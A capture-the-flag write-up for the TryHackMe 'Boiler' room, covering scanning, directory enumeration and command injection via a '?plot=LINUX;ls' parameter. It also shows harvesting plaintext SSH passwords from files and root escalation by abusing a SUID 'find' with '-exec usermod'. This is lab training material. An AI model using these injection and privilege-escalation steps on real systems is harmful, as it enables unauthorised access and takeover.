# TryHackMe-Boiler CTF

## NMAP

```
Host is up (0.15s latency).
Not shown: 997 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.14.3.143
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
|_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https
```

## PORT 21 (FTP)

So `anonymous` login is allowed on ftp so ,

```
root@kali:~/TryHackMe/Medium/BoilerCTF# ftp 10.10.214.74
Connected to 10.10.214.74.
220 (vsFTPd 3.0.3)
Name (10.10.214.74:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.
ftp> get .info.txt
local: .info.txt remote: .info.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .info.txt (74 bytes).
226 Transfer complete.
74 bytes received in 0.00 secs (587.5254 kB/s)
ftp> 

```
We find a hidden file named `info.txt`

This is the content of the file

```
hfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```
<img src="https://imgur.com/nTfXRPJ.png"/>

Well this is a rabbit hole but so lets enumerate other ports .

## PORT 80 (HTTP)

We get a deafult apache web page

<img src="https://imgur.com/gFqIWoq.png"/>

But it's good to always view the source page and since nmap showed us that there is `robots.txt` so lets look for it 

<img src="https://imgur.com/jSH9tP7.png"/>

There wasn't anything useful in the source code of web page.




Running gobuster we found some directories

```
root@kali:~/TryHackMe/Medium/BoilerCTF# gobuster dir -u http://10.10.214.74/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1      
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.214.74/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/08 23:32:44 Starting gobuster 
===============================================================
/manual (Status: 301)      
/joomla (Status: 301)          
```

I ran gobuster on `/joomla`

```
root@kali:~/TryHackMe/Medium/BoilerCTF# gobuster dir -u http://10.10.214.74/joomla -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.214.74/joomla
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/08 23:35:14 Starting gobuster 
===============================================================
/images (Status: 301)
/media (Status: 301)
/templates (Status: 301)
/modules (Status: 301)
/tests (Status: 301)
/bin (Status: 301)
/plugins (Status: 301)
/includes (Status: 301)
/language (Status: 301)
/components (Status: 301)
/cache (Status: 301)
/libraries (Status: 301)
/installation (Status: 301)
/build (Status: 301)
/tmp (Status: 301)
/layouts (Status: 301)
/administrator (Status: 301)
```

I kept this brute force ruuning in the background and focused on enumurating other stuff ,`/administrator` presented us a login page

<img src="https://imgur.com/kDz7kyw.png"/>


## PORT 10000 (HTTPS)

There is a login page by the name of `webmin` but by answering the question on the room it doesn't seen that we 
<img src="https://imgur.com/m21Vrx3.png"/>


## Coming back to PORT 80

I saw that my gobuster reutrned some more directories

```
/cli (Status: 301)
/_files (Status: 301)
```

`/cli` was empty but `/_files` was interesting


<img src="https://imgur.com/SsPdcri.png"/>

This time I used `ciphey` if you want to install this https://github.com/Ciphey/Ciphey , and this was nothing but a rabbithole again :D

```
root@kali:~/TryHackMe/Medium/BoilerCTF# ciphey -t VjJodmNITnBaU0JrWVdsemVRbz0K
Result 'Whopsie daisy\n' (y/N): y
Format used:
  base64
  utf8
  base64
  utf8
Final result: "Whopsie daisy"
```


I again run directory bruteforcing through `big.txt`

```
=============================================================
Gobuster v3.0.1         
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.214.74/joomla
[+] Threads:        10                                                    
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403                
[+] User Agent:     gobuster/3.0.1                                        
[+] Timeout:        10s
===============================================================
2020/11/09 00:37:20 Starting gobuster 
===============================================================
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/_archive (Status: 301)
/_database (Status: 301)
/_files (Status: 301)
/_test (Status: 301)
/administrator (Status: 301)
/bin (Status: 301)
/build (Status: 301)
/cache (Status: 301)
/cli (Status: 301)
/components (Status: 301)
/images (Status: 301)
/includes (Status: 301)
/language (Status: 301)
/layouts (Status: 301)
/libraries (Status: 301)
/media (Status: 301)
/modules (Status: 301)
/plugins (Status: 301)
/robots.txt (Status: 200)

```
And this time found archive,test,files so lets visit that

<img src="https://imgur.com/i58lDNP.png"/>

On this page run commands like this `?plot=LINUX;ls` this will show the files in that directory and we can read  `log.txt`

From that file we can find ssh credentials

```
basterd:superduperp@$$
```

## PORT 55007 (SSH)

<img src="https://imgur.com/NpbyE0y.png"/>

On viewing `backup.sh` we can find `stoner`'s password `superduperp@$$no1knows`

<img src="https://imgur.com/QPwReOp.png"/>


Checking for SUID we found

```
stoner@Vulnerable:/home/basterd$ find / -perm /4000 2>/dev/null                                                                                     
/bin/su                                                                   
/bin/fusermount                                                                                                                                     
/bin/umount                                                                                                                                         
/bin/mount                                                                                                                                          
/bin/ping6                                                                                                                                          
/bin/ping                                                                                                                                           
/usr/lib/policykit-1/polkit-agent-helper-1                                                                                                          
/usr/lib/apache2/suexec-custom                                                                                                                      
/usr/lib/apache2/suexec-pristine                                                                                                                    
/usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                         
/usr/lib/openssh/ssh-keysign                                                                                                                        
/usr/lib/eject/dmcrypt-get-device                                                                                                                   
/usr/bin/newgidmap                                                                                                                                  
/usr/bin/find                                                                                                                                       
/usr/bin/at                                                                                                                                         
/usr/bin/chsh                                                                                                                                       
/usr/bin/chfn                                                                                                                                       
/usr/bin/passwd                                                                                                                                     
/usr/bin/newgrp                                                                                                                                     
/usr/bin/sudo                                                                                                                                       
/usr/bin/pkexec                                                                                                                                     
/usr/bin/gpasswd                                                                                                                                    
/usr/bin/newuidmap   
```

`find` can be used to privesc so, first I tried to give `/bin/bash` SUID but it failed then I put `stoner` in sudoers and then it got executed then switched to `stoner` again and then we can execute `bash` as `root` 

```


stoner@Vulnerable:/home/basterd$ find . -exec chmod+s /bin/bash
find: missing argument to `-exec'
stoner@Vulnerable:/home/basterd$ find . -exec usermod -aG sudo stoner \;
stoner@Vulnerable:/home/basterd$ sudo bash
[sudo] password for stoner: 
Sorry, try again.
[sudo] password for stoner: 
Sorry, user stoner is not allowed to execute '/bin/bash' as root on Vulnerable.
stoner@Vulnerable:/home/basterd$ whoami
stoner
stoner@Vulnerable:/home/basterd$ sudo -l
User stoner may run the following commands on Vulnerable:
    (root) NOPASSWD: /NotThisTime/MessinWithYa
stoner@Vulnerable:/home/basterd$ su stoner
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

stoner@Vulnerable:/home/basterd$ sudo bash
[sudo] password for stoner: 
root@Vulnerable:/home/basterd# 

```